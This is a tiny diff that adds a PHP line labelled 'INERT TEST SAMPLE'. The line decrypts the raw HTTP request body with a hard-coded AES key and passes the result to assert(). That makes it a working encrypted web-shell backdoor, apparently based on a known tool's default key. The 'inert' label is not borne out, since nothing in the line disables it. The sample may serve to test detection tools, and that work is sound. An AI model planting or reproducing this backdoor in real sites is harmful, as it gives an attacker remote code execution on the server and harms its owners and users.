@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+$key = "e45e329feb5d925b"; $post = openssl_decrypt(file_get_contents("php://input"), "AES128", $key); assert($post);
+
